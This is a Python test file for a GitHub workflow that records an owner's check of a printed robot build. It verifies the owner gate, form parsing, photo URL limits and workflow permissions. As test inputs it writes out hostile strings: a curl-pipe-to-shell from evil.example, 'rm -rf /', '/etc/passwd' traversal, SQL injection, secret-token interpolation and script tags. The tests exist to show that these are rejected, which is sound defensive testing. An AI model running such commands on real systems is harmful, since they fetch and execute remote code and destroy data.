# SPDX-License-Identifier: MIT
"""Recording the owner's check of a printed build: the gate (only the
repository owner's issue is applied), the reading of the issue form (whose
text is untrusted), the admin page's prefilled links, and the workflow file.
The workflow itself runs on GitHub and is not run here."""
import importlib.util
import json
import re
import shutil
import subprocess
import urllib.parse

import pytest

from conftest import ROOT

SPEC = importlib.util.spec_from_file_location("record_validation", ROOT / "scripts" / "record_validation.py")
rv = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(rv)

PNG = b"\x89PNG\r\n\x1a\n" + b"\0" * 64
JPEG = b"\xff\xd8\xff\xe0" + b"\0" * 64
ATTACHMENT = "https://github.com/user-attachments/assets/0f1e2d3c-aaaa-bbbb-cccc-1234567890ab"


def form(build="unoq-biped-braccio_shield", part="_No response_", date="2026-11-11", checked="All parts printed, it stands.",
         result="fits and works", notes="_No response_", photo="_No response_", remove=False):
    box = "- [X] Remove this mark instead of recording one" if remove else "- [ ] Remove this mark instead of recording one"
    return (f"### Build id\n\n{build}\n\n### Part file\n\n{part}\n\n### Date\n\n{date}\n\n### What was checked\n\n{checked}\n\n"
            f"### Result\n\n{result}\n\n### Notes on changes made\n\n{notes}\n\n### Photo\n\n{photo}\n\n### Remove\n\n{box}\n")


def event(body, author="eoinjordan", association="OWNER", labels=("validated",), owner="eoinjordan", number=7):
    return {"action": "opened", "repository": {"owner": {"login": owner}},
            "issue": {"number": number, "body": body, "user": {"login": author}, "author_association": association,
                      "labels": [{"name": name} for name in labels]}}


@pytest.fixture()
def root(tmp_path):
    (tmp_path / "config").mkdir()
    shutil.copyfile(ROOT / "config" / "compat.json", tmp_path / "config" / "compat.json")
    (tmp_path / "config" / "validated.json").write_text('{"records": []}\n', encoding="utf-8")
    (tmp_path / "stl").mkdir()
    shutil.copyfile(ROOT / "stl" / "manifest.json", tmp_path / "stl" / "manifest.json")
    return tmp_path


def records(root):
    return json.loads((root / "config" / "validated.json").read_text(encoding="utf-8"))["records"]


def no_fetch(url):
    raise AssertionError("nothing may be fetched for this form")


# --- the gate -----------------------------------------------------------------

def test_only_the_repository_owner_is_applied(root):
    assert rv.gate(event(form())) is None
    for other in (event(form(), author="someone"), event(form(), association="CONTRIBUTOR"),
                  event(form(), association="MEMBER"), event(form(), author="someone", association="OWNER"),
                  event(form(), author="EoinJordan"), event(form(), owner="")):
        assert rv.gate(other) == rv.NOT_OWNER
        assert rv.run(other, root, no_fetch) == (False, "Only the repository owner can record a validation. Nothing was changed.")
    assert "label" in rv.gate(event(form(), labels=("bug",)))
    assert rv.run({"issue": None}, root, no_fetch)[0] is False
    assert records(root) == []


# --- the form -----------------------------------------------------------------

def test_a_good_form_is_recorded_and_shows_as_a_mark(root):
    changed, message = rv.run(event(form()), root, no_fetch)
    assert changed and message.startswith("Recorded: unoq-biped-braccio_shield printed and checked on 2026-11-11.")
    assert records(root) == [{"id": "unoq-biped-braccio_shield", "part": "", "date": "2026-11-11", "checked": "All parts printed, it stands.",
                              "result": "fits and works", "notes": "", "photo": "", "by": "eoinjordan", "mark": True, "issue": 7}]
    # The site reads the same file.
    from microduck import recipe
    data = recipe.bundle(ROOT)
    data["validated"] = recipe.validated(root)
    assert recipe.evaluate(data, {})["validated"] == {"date": "2026-11-11", "checked": "All parts printed, it stands.", "photo": ""}
    # Submitting again replaces the record; a part is recorded beside the build.
    rv.run(event(form(date="2026-11-10", result="fits with changes", notes="Opened the pin holes to 5.1 mm.")), root, no_fetch)
    rv.run(event(form(part="fit_SR431.stl")), root, no_fetch)
    assert [(r["part"], r["date"], r["mark"]) for r in records(root)] == [("", "2026-11-10", True), ("fit_SR431.stl", "2026-11-11", True)]
    assert records(root)[0]["notes"] == "Opened the pin holes to 5.1 mm."


def test_does_not_fit_is_a_note_without_a_mark_and_removal_works(root):
    changed, message = rv.run(event(form(part="fit_SR311.stl", result="does not fit")), root, no_fetch)
    assert changed and message.startswith("Recorded as a note without a mark")
    assert records(root)[0]["mark"] is False
    from microduck import recipe
    data = recipe.bundle(ROOT)
    data["validated"] = recipe.validated(root)
    assert all(item["validated"] == "" for item in recipe.evaluate(data, {})["print"]["files"])
    assert rv.run(event(form(part="fit_SR311.stl", remove=True)), root, no_fetch) == (True, "Removed the mark for unoq-biped-braccio_shield, part fit_SR311.stl.")
    assert records(root) == []
    changed, message = rv.run(event(form(remove=True)), root, no_fetch)
    assert not changed and message.startswith("There was no mark")


@pytest.mark.parametrize("fields, reason", [
    (dict(build="unoq-biped-braccio_shield; rm -rf /"), "build id"),
    (dict(build="../../etc/passwd"), "build id"),
    (dict(build="ev3-biped-braccio_shield"), "build id"),
    (dict(build=""), "build id"),
    (dict(part="../config/compat.json"), "part file"),
    (dict(part="fit_SR431.stl\nextra"), "part file"),
    (dict(date="11/11/2026"), "YYYY-MM-DD"),
    (dict(date="2026-13-40"), "not a real date"),
    (dict(date="2026-11-11'); DROP TABLE"), "YYYY-MM-DD"),
    (dict(date="1999-01-01"), "outside the range"),
    (dict(date="2999-01-01"), "outside the range"),
    (dict(result="works great"), "three choices"),
])
def test_bad_fields_change_nothing(root, fields, reason):
    changed, message = rv.run(event(form(**fields)), root, no_fetch)
    assert not changed and reason in message and message.endswith("Nothing was changed.")
    assert records(root) == []


def test_a_hostile_body_is_only_ever_text(root):
    nasty = "$(curl evil.example | sh) `id` ${{ secrets.GITHUB_TOKEN }} <script>alert(1)</script> \x00\x1b[31m‮" + "A" * 5000
    changed, _ = rv.run(event(form(checked=nasty, notes="### Build id\n\nev3-crank-ev3_motors")), root, no_fetch)
    assert changed
    record = records(root)[0]
    # A heading repeated inside a field is that field's text: it does not change which build is recorded.
    assert record["id"] == "unoq-biped-braccio_shield" and "ev3-crank-ev3_motors" in record["notes"]
    assert len(record["checked"]) <= rv.TEXT_LIMIT and "\x00" not in record["checked"] and "\x1b" not in record["checked"]
    assert all(ch.isprintable() for ch in record["checked"] + record["notes"])
    assert "\n" not in json.dumps(record["checked"])[1:-1].replace("\\n", "")
    # The file is still one JSON document with the fields this script writes and no others.
    assert set(record) == {"id", "part", "date", "checked", "result", "notes", "photo", "by", "mark", "issue"}
    source = (ROOT / "scripts" / "record_validation.py").read_text(encoding="utf-8")
    for needle in ("subprocess", "os.system", "shell=True", "eval(", "exec("):
        assert needle not in source, needle
    assert rv.parse("no headings at all")["build"] == ""
    assert rv.run(event("x" * 200_000), root, no_fetch)[0] is False
    assert rv.run(event(None), root, no_fetch)[0] is False


def test_photo_only_from_githubs_attachment_hosts_and_only_an_image(root):
    def good(url):
        assert url == ATTACHMENT
        return "image/jpeg", JPEG

    changed, _ = rv.run(event(form(photo=f"![photo]({ATTACHMENT})")), root, good)
    assert changed
    photo = records(root)[0]["photo"]
    assert re.fullmatch(r"docs/validated/unoq-biped-braccio_shield-2026-11-11-[0-9a-f]{10}\.jpg", photo)
    assert (root / photo).read_bytes() == JPEG

    for bad in ("http://github.com/user-attachments/assets/x", "https://evil.example/user-attachments/assets/x.png",
                "https://github.com/eoinjordan/botbuilder/raw/main/x.png", "https://github.com.evil.example/user-attachments/assets/x",
                "https://user@github.com/user-attachments/assets/x", "https://github.com:8443/user-attachments/assets/x"):
        changed, message = rv.run(event(form(part="fit_SR431.stl", photo=bad)), root, no_fetch)
        assert not changed and "photo" in message.lower(), bad
    for kind, data, reason in (("text/html", b"<html>", "PNG or JPEG"), ("image/png", b"GIF89a", "PNG or JPEG"),
                               ("image/svg+xml", b"<svg/>", "PNG or JPEG"), ("image/png", PNG + b"\0" * rv.PHOTO_LIMIT, "larger than")):
        changed, message = rv.run(event(form(part="fit_SR431.stl", photo=ATTACHMENT)), root, lambda url: (kind, data))
        assert not changed and reason in message

    def broken(url):
        raise OSError("timed out")

    assert "could not be fetched" in rv.run(event(form(part="fit_SR431.stl", photo=ATTACHMENT)), root, broken)[1]
    assert len(records(root)) == 1
    assert sorted(p.name for p in (root / "docs" / "validated").iterdir()) == [photo.rsplit("/", 1)[1]]


def test_command_line_writes_the_outcome_and_the_flag(root, tmp_path):
    path = tmp_path / "event.json"
    path.write_text(json.dumps(event(form(), author="someone")), encoding="utf-8")
    out = tmp_path / "outcome.md"
    flag = tmp_path / "github_output"
    assert rv.main(["--event", str(path), "--outcome", str(out), "--github-output", str(flag)]) == 0
    assert out.read_text(encoding="utf-8").strip() == rv.NOT_OWNER
    assert flag.read_text(encoding="utf-8") == "changed=false\n"
    path.write_text("not json", encoding="utf-8")
    assert rv.main(["--event", str(path), "--outcome", str(out)]) == 0
    assert "could not be read" in out.read_text(encoding="utf-8")


# --- the workflow, the form and the site ----------------------------------------

def test_workflow_has_the_owner_gate_least_privilege_and_no_body_on_a_command_line():
    text = (ROOT / ".github" / "workflows" / "validated.yml").read_text(encoding="utf-8")
    assert "\t" not in text
    # No YAML parser is installed here: the structure is checked as text, line by line.
    keys = [line.split(":")[0] for line in text.splitlines() if re.match(r"^[a-z]", line)]
    assert keys == ["name", "on", "permissions", "concurrency", "jobs"]
    assert re.search(r"on:\n  issues:\n    types: \[opened, edited\]\n", text)
    assert re.search(r"permissions:\n  contents: write\n  issues: write\n\n", text), "these two and no others"
    assert re.search(r"concurrency:\n  group: validated\n  cancel-in-progress: false\n", text)
    assert "if: contains(github.event.issue.labels.*.name, 'validated')" in text
    gate = "if: github.event.issue.user.login != github.repository_owner || github.event.issue.author_association != 'OWNER'"
    assert gate in text and "Only the repository owner can record a validation" in text
    steps = text.split("    steps:\n")[1]
    first = steps.split("      - ")[1]
    assert gate in first and 'echo "stop=true"' in first, "the gate is the first step"
    later = steps.split("      - ")[2:]
    assert len(later) == 5 and all("steps.gate.outputs.stop != 'true'" in step for step in later)
    # The issue's text never reaches a shell: the only event values used are its number and two logins in conditions.
    used = set(re.findall(r"\$\{\{\s*([^}]+?)\s*\}\}", text))
    assert used == {"github.token", "github.event.issue.number"}
    for needle in ("issue.body", "issue.title", "event.comment", "pull_request_target"):
        assert needle not in text, needle
    assert re.findall(r"uses: (\S+)", text) == ["actions/checkout@v4", "actions/setup-python@v5"]
    assert 'python scripts/record_validation.py --event "$GITHUB_EVENT_PATH"' in text
    assert "git config user.name eoinjordan" in text and "11853924+eoinjordan@users.noreply.github.com" in text
    assert "git add config/validated.json docs/validated" in text and "git push origin HEAD:main" in text
    assert "--body-file" in text and "gh issue close" in text
    pages = (ROOT / ".github" / "workflows" / "pages.yml").read_text(encoding="utf-8")
    assert "'config/**'" in pages and "'docs/validated/**'" in pages and "'programs/**'" in pages and pages.count("'stl/**'") == 1


def test_issue_form_fields_match_what_the_script_reads():
    text = (ROOT / ".github" / "ISSUE_TEMPLATE" / "validated.yml").read_text(encoding="utf-8")
    assert 'labels: ["validated"]' in text and "name: Mark a build as validated" in text
    assert re.findall(r"    id: (\w+)", text) == ["build", "part", "date", "checked", "result", "changes", "photo", "remove"]
    labels = re.findall(r"      label: (.+)", text)
    assert labels[:8] == ["Build id", "Part file", "Date", "What was checked", "Result", "Notes on changes made", "Photo", "Remove"]
    for label in labels[:8]:
        assert any(label.lower().startswith(start) for start in rv.FIELDS), label
    assert [line.strip()[2:] for line in text.splitlines() if line.startswith("        - ") and "label" not in line] == list(rv.RESULTS)
    fields = rv.parse(form(notes="Sanded the tab.", photo=ATTACHMENT, remove=True))
    assert fields == {"build": "unoq-biped-braccio_shield", "part": "", "date": "2026-11-11", "checked": "All parts printed, it stands.",
                      "result": "fits and works", "notes": "Sanded the tab.", "photo": ATTACHMENT,
                      "remove": "- [X] Remove this mark instead of recording one"}


def test_admin_page_lists_builds_and_parts_and_prefills_the_form(tmp_path):
    html = (ROOT / "site" / "admin.html").read_text(encoding="utf-8")
    script = (ROOT / "site" / "admin.js").read_text(encoding="utf-8")
    assert "only the repository owner's submissions are applied" in " ".join(html.split())
    assert "uses your GitHub login on github.com" in " ".join(html.split())
    assert 'id="admin-filter"' in html and 'id="admin-unmarked"' in html and '<script type="module" src="./admin.js">' in html
    for needle in ("token", "password", "localStorage", "Authorization", "client_id", "oauth", "api.github.com"):
        assert needle not in script.lower().replace("no token", "") and needle not in html.lower().replace("holds no login", ""), needle
    assert script.count("fetch(") == 1 and 'fetch("./data/recipe.json")' in script
    node = shutil.which("node")
    if node is None:
        pytest.skip("Node is not installed; site/admin.js was not run")
    from microduck import recipe
    data = recipe.bundle(ROOT)
    data["validated"] = [{"id": "ev3-crank-ev3_motors", "part": "", "date": "2026-12-02", "checked": "walks", "photo": "", "mark": True}]
    shutil.copyfile(ROOT / "site" / "build.js", tmp_path / "build.mjs")
    (tmp_path / "admin.mjs").write_text(script.replace('"./build.js"', '"./build.mjs"'), encoding="utf-8")
    (tmp_path / "data.json").write_text(json.dumps(data), encoding="utf-8")
    (tmp_path / "driver.mjs").write_text("""
import { readFileSync } from "node:fs";
import { adminRows, issueLink } from "./admin.mjs";
const data = JSON.parse(readFileSync("data.json", "utf8"));
const rows = adminRows(data);
console.log(JSON.stringify({ rows, links: [
  issueLink(data.compat.repo_url, { build: "unoq-biped-braccio_shield", part: "", date: "2026-11-11" }),
  issueLink(data.compat.repo_url, { build: "ev3-crank-ev3_motors", part: "lego/ev3-pixy2/chassis.stl", date: "2026-11-11" }),
  issueLink(data.compat.repo_url, { build: "a b&c=d#e", part: "x y/z?.stl", date: "2026-11-11" }),
] }));
""", encoding="utf-8")
    done = subprocess.run([node, "driver.mjs"], cwd=tmp_path, check=True, capture_output=True, text=True, encoding="utf-8", timeout=120)
    out = json.loads(done.stdout)
    builds = [row for row in out["rows"] if row["kind"] == "build"]
    parts = [row for row in out["rows"] if row["kind"] == "part"]
    assert [row["build"] for row in builds] == rv.known_builds(ROOT), "every build that is possible"
    assert [row["part"] for row in parts] == rv.known_parts(ROOT), "every printable part"
    assert all(row["tag"] not in ("Not possible", "Needs a part") for row in builds)
    marked = [row for row in builds if row["record"]]
    assert [row["build"] for row in marked] == ["ev3-crank-ev3_motors"] and marked[0]["record"]["date"] == "2026-12-02"
    for link, build, part in zip(out["links"], ("unoq-biped-braccio_shield", "ev3-crank-ev3_motors", "a b&c=d#e"),
                                 ("", "lego/ev3-pixy2/chassis.stl", "x y/z?.stl")):
        assert link.startswith("https://github.com/eoinjordan/botbuilder/issues/new?")
        query = urllib.parse.parse_qs(urllib.parse.urlsplit(link).query, keep_blank_values=True)
        assert query["template"] == ["validated.yml"] and query["build"] == [build] and query["date"] == ["2026-11-11"]
        assert query.get("part", [""]) == [part]
        assert urllib.parse.urlsplit(link).fragment == "", "nothing leaks out of the query string"
    assert "docs/admin.md" in html and (ROOT / "docs" / "admin.md").is_file()
